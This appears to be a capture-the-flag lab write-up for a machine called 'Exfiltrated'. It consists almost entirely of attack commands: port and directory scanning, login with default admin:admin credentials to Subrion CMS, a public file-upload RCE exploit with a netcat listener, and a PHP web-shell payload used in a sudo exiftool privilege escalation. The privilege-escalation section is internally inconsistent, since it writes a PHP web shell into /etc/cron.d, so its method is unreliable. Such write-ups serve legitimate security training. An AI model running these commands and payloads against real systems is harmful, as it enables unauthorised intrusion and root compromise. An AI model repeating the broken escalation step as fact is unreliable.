# Exfiltrated

> Subrion CMS / sudo exiftool

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.108

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Enumerating port 80
Found Subrion CMS version 4.2.1. Default credentials admin:admin worked.
```shell
# Enum dir
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 2 -x php,html -C 404,502 -u http://192.168.182.108

http://192.168.182.108/panel/
```
### Initial Access
Subrion 4.2.1 is vulnerable to authenticated file upload RCE (CVE-2018-19422).
```shell
# Search exploit
searchsploit subrion 4.2.1
Subrion CMS 4.2.1 - File Upload Bypass (Authenticated)  | php/webapps/49876.py

searchsploit -m 49876

# Listener
rlwrap -cAra nc -vnlp 443

# Exploit
python3 49876.py -u http://192.168.182.108/panel/ -l admin -p admin

# TTY Upgrade
/usr/bin/python3 -c "import pty;pty.spawn('/bin/bash')"

# Evidence
cat /var/www/html/local.txt
```
### Privilege Escalation
```shell
# Sudo check
sudo -l
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/exiftool

# Cron running exiftool
cat /opt/exiftool-exec.sh

# Exploit via malicious image
# Create image with embedded command using exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
mv shell.jpg shell.php.jpg

# GTFOBins exiftool sudo
sudo exiftool -filename=/etc/cron.d/shell shell.php.jpg
```
### Post-Exploitation
```shell
# Evidence
cat /root/proof.txt
```
